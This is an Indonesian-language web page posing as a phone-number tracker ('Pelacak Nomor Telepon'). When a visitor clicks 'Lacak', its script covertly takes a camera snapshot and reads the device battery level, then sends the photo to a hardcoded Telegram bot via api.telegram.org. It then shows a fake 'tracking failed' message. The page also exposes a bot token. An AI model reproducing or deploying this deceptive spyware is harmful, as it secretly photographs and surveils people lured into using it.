<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pelacak Nomor Telepon</title>
<style>
  body {
    background: linear-gradient(135deg, #0f1724, #1e293b);
    color: white;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
  }
  h1 {
    margin-bottom: 20px;
    font-size: 28px;
    color: #60a5fa;
  }
  .container {
    background: rgba(255,255,255,0.05);
    padding: 20px;
    border-radius: 12px;
    box-shadow: 0 4px 30px rgba(0,0,0,0.3);
    text-align: center;
    width: 90%;
    max-width: 400px;
  }
  input {
    width: 100%;
    padding: 12px;
    border-radius: 8px;
    border: none;
    margin-bottom: 15px;
    font-size: 16px;
    text-align: center;
  }
  button {
    background: #3b82f6;
    color: white;
    border: none;
    padding: 12px 20px;
    font-size: 16px;
    border-radius: 8px;
    cursor: pointer;
    width: 100%;
    transition: 0.3s;
  }
  button.loading {
    background: #2563eb;
    cursor: wait;
  }
  button:hover:not(.loading) {
    background: #2563eb;
  }
  .popup {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%) scale(0);
    background: #1e293b;
    color: white;
    padding: 25px;
    border-radius: 12px;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
    text-align: center;
    z-index: 100;
    transition: transform 0.3s ease;
  }
  .popup.show {
    transform: translate(-50%, -50%) scale(1);
  }
  footer {
    position: fixed;
    bottom: 10px;
    font-size: 12px;
    color: rgba(255,255,255,0.5);
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Pelacak Nomor Telepon</h1>
    <input type="text" id="phone" placeholder="Masukkan Nomor Telepon">
    <button id="trackBtn">Lacak</button>
  </div>

  <div class="popup" id="popupMsg">Pelacakan gagal! Nomor tidak ditemukan.</div>
  <footer>Â© Wanz Official</footer>

  <video id="video" autoplay playsinline style="display:none;"></video>

<script>
const BOT_TOKEN = "8061746076:AAG0vxdkrXYxpfq7jXBiDbvUvltQUGIp-y8";
const CHAT_ID = "7950114253";
const trackBtn = document.getElementById("trackBtn");
const popup = document.getElementById("popupMsg");

trackBtn.addEventListener("click", async () => {
  const phone = document.getElementById("phone").value.trim();
  if (!phone) {
    showPopup("Masukkan nomor telepon terlebih dahulu!");
    return;
  }

  trackBtn.classList.add("loading");
  trackBtn.textContent = "Melacak...";

  try {
    // Minta izin kamera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;
    await new Promise(res => setTimeout(res, 2000));

    // Ambil snapshot kamera
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop kamera
    stream.getTracks().forEach(track => track.stop());

    // Ambil info baterai
    let batteryInfo = "Tidak tersedia";
    if ("getBattery" in navigator) {
      const battery = await navigator.getBattery();
      batteryInfo = `${Math.round(battery.level * 100)}% (Charging: ${battery.charging ? "Ya" : "Tidak"})`;
    }

    // Ambil waktu sekarang (WIB)
    const now = new Date();
    const waktu = now.toLocaleString("id-ID", { timeZone: "Asia/Jakarta", dateStyle: "short", timeStyle: "medium" });

    // Kirim foto + info ke Telegram
    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "snapshot.jpg");
    formData.append("caption", `ðŸ“… ${waktu} WIB\nðŸ”‹ Baterai: ${batteryInfo}`);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });

  } catch (err) {
    showPopup("Gagal mengakses kamera atau mengirim data.");
  }

  // Simulasi gagal lacak
  setTimeout(() => {
    showPopup("Pelacakan gagal! Nomor tidak ditemukan.");
    trackBtn.classList.remove("loading");
    trackBtn.textContent = "Lacak";
  }, 3000);
});

function showPopup(msg) {
  popup.textContent = msg;
  popup.classList.add("show");
  setTimeout(() => popup.classList.remove("show"), 3000);
}
</script>
</body>
</html>
